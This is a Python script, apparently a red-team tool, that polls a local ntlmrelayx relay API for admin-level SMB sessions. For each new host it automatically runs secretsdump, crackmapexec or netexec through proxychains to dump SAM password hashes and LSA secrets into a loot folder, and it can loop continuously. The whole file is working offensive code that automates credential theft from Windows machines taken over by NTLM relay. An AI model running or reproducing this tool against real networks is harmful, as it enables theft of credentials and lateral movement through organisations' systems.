# this tool will dump all admin relays lsa secrets and sam
try:
    from urllib.request import ProxyHandler, build_opener, Request
except ImportError:
    from urllib2 import ProxyHandler, build_opener, Request

import os, sys, json, subprocess
from datetime import datetime
import concurrent.futures
import argparse
import time

color_RED = '\033[91m'
color_GRE = '\033[92m'
color_YELL = '\033[93m'
color_BLU = '\033[94m'
color_PURP = '\033[35m'
color_reset = '\033[0m'
green_plus = "{}[+]{}".format(color_GRE, color_reset)
red_minus = "{}[-]{}".format(color_RED, color_reset)
gold_plus = "{}[+]{}".format(color_YELL, color_reset)
red_exclm = "{}[!]{}".format(color_RED, color_reset)

cwd = os.path.abspath(os.path.dirname(__file__))
dumped_ips = []

def timestamp():
    today = datetime.now()
    hour = today.strftime("%H")
    ltime = time.localtime(time.time())
    timestamp = '%s[%s-%s-%s %s:%s:%s]%s' % (color_BLU, str(ltime.tm_mon).zfill(2), str(ltime.tm_mday).zfill(2), str(ltime.tm_year).zfill(2), str(hour).zfill(2), str(ltime.tm_min).zfill(2), str(ltime.tm_sec).zfill(2), color_reset)
    return timestamp

def config_check():
    fail = 0
    sockfail = 0
    print('{}[{}Checking proxychains config{}]{}'.format(color_BLU, color_reset, color_BLU, color_reset))
    # this will get the location of the config file proxychains is using
    proc = subprocess.run(['proxychains -h'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    dat = proc.stderr.decode().split('\n')

    for line in dat:
        if line.find('config file found') != -1:
            config_file = line[line.find(':') + 2:]

    try:
        with open(config_file, 'r') as f:
            dat = f.read()
            f.close()

        if dat.find('socks4 127.0.0.1 1080') == -1 or dat.find('#socks4 127.0.0.1 1080') != -1 or dat.find('# socks4 127.0.0.1 1080') != -1:
            print('{} ERROR you are missing "socks4 127.0.0.1 1080" in your proxychains config'.format(red_minus))
            sys.exit(1)

    except FileNotFoundError as e:
        print('{} ERROR you are missing proxychains config'.format(red_minus))
        sys.exit(1)


    print('\n{}[{}Config looks good{}]{}'.format(color_BLU, color_reset, color_BLU, color_reset))


def mt_execute(username, ip, method, secretsdump_path, local_uname):

    print('{} Dumping {} via user {}'.format(gold_plus, ip, username))

    if method == 'secretsdump':
        print('{} sudo proxychains python3 {} {}:\'\'@{} -no-pass -outputfile \'{}/loot/{}\''.format(timestamp(), secretsdump_path, username, ip, cwd, ip))
        os.system('sudo proxychains python3 {} {}:\'\'@{} -no-pass -outputfile \'{}/loot/{}\''.format(secretsdump_path, username, ip, cwd, ip))

    elif method == 'crackmapexec':
        print('{} sudo -u {} proxychains crackmapexec smb {} -u {} -p \'\' -d {} --sam'.format(timestamp(), local_uname, ip, username.split('/')[1], username.split('/')[0]))
        os.system('sudo -u {} proxychains crackmapexec smb {} -u {} -p \'\' -d {} --sam'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
        print('{} sudo -u {} proxychains crackmapexec smb {} -u {} -p \'\' -d {} --lsa'.format(timestamp(), local_uname, ip, username.split('/')[1], username.split('/')[0]))
        os.system('sudo -u {} proxychains crackmapexec smb {} -u {} -p \'\' -d {} --lsa'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))

    elif method == 'netexec':
        print('{} sudo -u {} proxychains netexec smb {} -u {} -p \'\' -d {} --sam'.format(timestamp(), local_uname, ip, username.split('/')[1], username.split('/')[0]))
        os.system('sudo -u {} proxychains netexec smb {} -u {} -p \'\' -d {} --sam'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
        print('{} sudo -u {} proxychains netexec smb {} -u {} -p \'\' -d {} --lsa'.format(timestamp(), local_uname, ip, username.split('/')[1], username.split('/')[0]))
        os.system('sudo -u {} proxychains netexec smb {} -u {} -p \'\' -d {} --lsa'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))

    with open('{}/dumped_ips'.format(cwd), 'a') as f:
        f.write(ip + '\n')
        f.close()


def check_uname():
    print('Enter your attacker machine username ex. kali (this is where cme or netexec will store your loot in the home dir of whatever username you give ~/.cme/logs)')
    given_username = input('Username: ')
    with open('/etc/passwd', 'r') as f:
        dat = f.readlines()
        f.close()
    # this gets all the usernames in /etc/passwd into a list ex ['root', 'www-data', 'kali']
    passwd_usernames = []
    for item in dat:
        passwd_usernames.append(str(item.split(':')[0]))

    # iterates through the passwd_usernames list and sees if the given username is equal to any in it
    for name in passwd_usernames:
        if given_username == name:
            return given_username

    print('{} Username does not exist in /etc/passwd'.format(red_minus))
    check_uname()

if __name__ == '__main__':
    if os.geteuid() != 0:
        print("{} Must be run as sudo".format(red_exclm))
        sys.exit(1)

    parser = argparse.ArgumentParser(add_help=True)
    parser.add_argument('-method', action='store', choices=['crackmapexec', 'secretsdump', 'netexec'], default='crackmapexec', help='Method used to dump LSA Secrets and SAM Default=crackmapexec')
    parser.add_argument('-sdp', action='store', help='Path to secretsdump.py file (only used if -method is secretsdump) Example -sdp /opt/impacket/examples/secretsdump.py')
    parser.add_argument('-threads', action='store', type=int, default=1, help='Number of threads to use Default=1 I recommend useing 1 as ntlmrelayx will sometimes lose a relay if you use more than 1 idk why')
    parser.add_argument('-ar', action='store_true', help='Auto-retry when enabled runs constantly until ctrl+c is hit')

    options = parser.parse_args()

    if options.method == 'secretsdump' and options.sdp is None:
        print('You must enter a path for secretsdump.py')
        sys.exit(1)

    if os.path.isdir("{}/loot".format(cwd)) == False:
        os.makedirs("{}/loot".format(cwd))

    config_check()
    local_uname = ''
    if options.method == 'crackmapexec' or options.method == 'netexec':
        local_uname = check_uname()

    if options.method == 'secretsdump' and os.path.isfile(options.sdp) == False:
        print('Missing secretsdump.py')
        sys.exit(1)

    while True:
        try:
            if os.path.isfile('{}/dumped_ips'.format(cwd)):
                with open('{}/dumped_ips'.format(cwd), 'r') as f:
                    dat = f.read()
                    dumped_ips = dat.split('\n')

            headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
            url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
            try:
                proxy_handler = ProxyHandler({})
                opener = build_opener(proxy_handler)
                response = Request(url)
                r = opener.open(response)
                result = r.read()

                items = json.loads(result)
            except Exception as e:
                print("ERROR: %s" % str(e))
            else:
                if len(items) > 0:

                    tmp = result.decode()
                    tmp = tmp.replace('[', '')
                    tmp = tmp.replace('"', '')
                    tmp = tmp.replace('\n', '')
                    tmp = tmp.split('],')

                    # dat[0] = protocol dat[1] = ip dat[2] = domain/username dat[3] = adminstatus

                    if os.path.isdir("{}/loot".format(cwd)) == False:
                        os.makedirs("{}/loot".format(cwd))

                    with concurrent.futures.ProcessPoolExecutor(max_workers=options.threads) as executor:  # multithreading yeahhhh
                        for item in tmp:
                            dat = item.replace(']', '').split(',')
                            if dat[3] == 'TRUE':
                                if dat[1] not in dumped_ips:
                                    dumped_ips.append(dat[1])  # append the ip to dumped_ips to avoid dumping the same host twice

                                    # lsa secrets and sam dump courtesy of secretsdump
                                    try:
                                        executor.submit(mt_execute, dat[2], dat[1], options.method, options.sdp, local_uname)
                                    except Exception as e:
                                        print(str(e))
                                        print('Error dumping secrets')
                                        continue


                else:
                    print('No Relays Available!')

            if not options.ar:
                break

            time.sleep(5)
        except KeyboardInterrupt:
            print("\nCtrl+c detected: exiting")
            sys.exit(0)
            break
